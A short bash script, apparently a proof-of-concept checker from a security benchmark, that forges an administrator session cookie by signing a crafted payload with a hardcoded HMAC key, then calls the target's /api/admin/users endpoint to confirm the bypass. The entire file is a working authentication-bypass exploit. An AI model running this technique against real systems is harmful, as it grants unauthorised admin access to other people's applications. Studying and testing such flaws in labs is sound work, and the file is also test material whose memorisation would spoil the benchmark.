#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
aid=$(user_id admin@bench.local)
session=$(python3 - "$aid" <<'PYS'
import base64,hmac,hashlib,sys
uid=sys.argv[1]
key=b"hardcoded-32-byte-gorilla-session-key"
payload=f"{uid}:admin@bench.local:admin:true:1".encode()
b=base64.urlsafe_b64encode(payload).rstrip(b"=").decode()
sig=base64.urlsafe_b64encode(hmac.new(key,b.encode(),hashlib.sha256).digest()).rstrip(b"=").decode()
print(f"{b}.{sig}")
PYS
)
curl -s -H "Cookie: session=$session" "$TARGET/api/admin/users" | grep -q 'admin@bench.local'
